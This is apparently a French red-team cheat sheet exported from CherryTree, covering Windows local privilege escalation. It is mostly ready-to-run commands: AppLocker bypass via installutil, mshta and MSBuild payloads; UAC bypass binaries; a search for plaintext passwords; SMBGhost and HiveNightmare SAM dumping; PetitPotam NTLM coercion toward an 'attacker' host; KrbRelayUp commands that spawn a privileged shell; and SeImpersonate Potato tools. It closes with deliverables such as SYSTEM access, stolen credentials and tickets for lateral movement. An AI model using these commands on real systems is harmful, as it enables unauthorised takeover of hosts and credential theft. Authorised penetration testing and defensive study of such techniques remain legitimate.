<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>06-Local Privesc</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>06-Local Privesc</h1><br/><p><ol><li><h2>Bypass AppLocker</h2></li><li><strong>Repérer la policy</strong> </p><p></li></ol><div class="codebox"><pre>Get-ChildItem -Path HKLM:<span style="color:#333333;font-weight:400">\S</span>OFTWARE<span style="color:#333333;font-weight:400">\P</span>olicies<span style="color:#333333;font-weight:400">\M</span>icrosoft<span style="color:#333333;font-weight:400">\W</span>indows<span style="color:#333333;font-weight:400">\S</span>afer<span style="color:#333333;font-weight:400">\C</span>odeIdentifiers</pre></div></p><p><ul><li><strong>Zones écriture</strong> <code>C:\Windows\Temp</code>, <code>C:\Windows\Tasks</code></li></ul></p><p><ul><li>Payloads classiques :</p><p></li></ul><div class="codebox"><pre>installutil.exe /LogFile= /LogToConsole=false /U C:<span style="color:#333333;font-weight:400">\r</span>unner.exe<br /><br />mshta.exe my.hta<br /><br />MSBuild.exe payload.xml<br /></pre></div></p><p></p><p><ul><li>➜ <em>Low access</em> même si AppLocker actif.</li></ul></p><p></p><p></p><p><ol><li>2. <h2>2. UAC Bypass (passage admin local)</h2></p><p></li></ol><div class="codebox"><pre>fodhelper.exe<br /><br />wreset.exe<br /><br />msdt.exe<br /><br />winPEASany.exe <span style="color:#0088ff;font-weight:400">#(module s1_elevate)</span></pre></div></p><p></p><p>➜ <em>Admin</em> (token élevé) sans mot de passe.</p><p></p><p></p><p><ol><li>3. <h2>3. Auto-Enum des vecteurs LPE</h2></p><p></li></ol><div class="codebox"><pre>.<span style="color:#333333;font-weight:400">\P</span>rivescCheck.ps1 <span style="color:#ff9d00;font-weight:700">;</span> Invoke-PrivescCheck -Extended</pre></div></p><p></p><p>Rapide inventaire des services vulnérables, DLL hijacking, autorisations faibles.</p><p></p><p>➜ <em>Admin</em> si vuln. trouvée.</p><p></p><p></p><p><ol><li>4. <h2>4. Chercher des credentials en clair</h2></li></ol></p><p><code> </code><div class="codebox"><pre>findstr /si pass* *.txt *.xml *.docx *.ini</pre></div></p><p></p><p>➜ <em>User Account</em> supplémentaires ou secrets d’app.</p><p></p><p></p><p><ol><li>5. <h2>5. Exploits Kernel / OS</h2></p><p></li></ol><table class="table"><tr><th>Vuln</th><th>Commande</th><th>Privilege</th></tr><tr><td>SMBGhost CVE-2020-0796</td><td>exploit PoC &gt; reverse shell</td><td>Admin</td></tr><tr><td>HiveNightmare / SeriousSAM CVE-2021-36934</td><td>vssadmin list shadows → dump SAM, SYSTEM, SECURITY</td><td>Admin</td></tr></table></p><p><ol><li>6. <h2>6. WebDAV Coercion (HTTP)</h2></li></ol></p><p>Déposer <code>searchConnector.ms</code> ou fichier WebDAV spécial.</p><p></p><p><div class="codebox"><pre>dnstool.py -u <span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span><span style="color:#333333;font-weight:400">\&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> --record attacker --action add --data <span style="color:#ff9d00;font-weight:700">&lt;</span>ip_atk<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span><br /><br />petitpotam.py -u <span style="color:#ff9d00;font-weight:700">&lt;</span>user<span style="color:#ff9d00;font-weight:700">&gt;</span> -p <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span> -d <span style="color:#ff9d00;font-weight:700">&lt;</span>domain<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\\</span>attacker@80/random.txt</pre></div></p><p></p><p>➜ <em>HTTP Coerce</em> (forçage d’auth NTLM vers l’attaquant).</p><p></p><p></p><p><ol><li>7. <h2>7. Kerberos Relay local (KrbRelayUp)</h2></li></ol></p><p><strong>Créer compte machine + délégation :</strong></p><p><div class="codebox"><pre>KrbRelayUp.exe relay -Domain <span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span> -CreateNewComputerAccount <span style="color:#333333;font-weight:400">\<br /></span>                     -ComputerName pc$ -ComputerPassword <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div><code></code></p><p><code></code></p><p><strong>Spawn shell privilégié :</strong></p><p><div class="codebox"><pre>KrbRelayUp.exe spawn -m rbdc -d <span style="color:#ff9d00;font-weight:700">&lt;</span>dom<span style="color:#ff9d00;font-weight:700">&gt;</span> -dc <span style="color:#ff9d00;font-weight:700">&lt;</span>dc_ip<span style="color:#ff9d00;font-weight:700">&gt;</span> <span style="color:#333333;font-weight:400">\<br /></span>                     -cb0 -cn pc$ -cp <span style="color:#ff9d00;font-weight:700">&lt;</span>pwd<span style="color:#ff9d00;font-weight:700">&gt;</span></pre></div><code></code></p><p><code></code></p><p>➜ <em>Admin</em> instantané via délégation RBCD.</p><p></p><p></p><p><ol><li>8. <h2>8. Abuse du droit SeImpersonate (services)</h2></li></ol></p><p><strong>Potato Suite</strong> : RoguePotato, GodPotato, PrintSpoofer, RemotePotato0</p><p></p><p>Exploite COM / RPC pour s’auto-impersonner SYSTEM.</p><p></p><p>➜ <em>Admin</em> / SYSTEM.</p><p></p><p></p><p><h2>Livrables de la phase 6</h2></p><p>Accès <strong>Admin/SYSTEM</strong> local sur chaque hôte compromis.</p><p></p><p>Nouveaux identifiants (fichiers clairs, SAM dump).</p><p></p><p>Tickets/jetons élevés prêts pour <em>mouvement latéral</em> et extraction LSASS.</p><p></p><p></p></div>
</body>
</html>
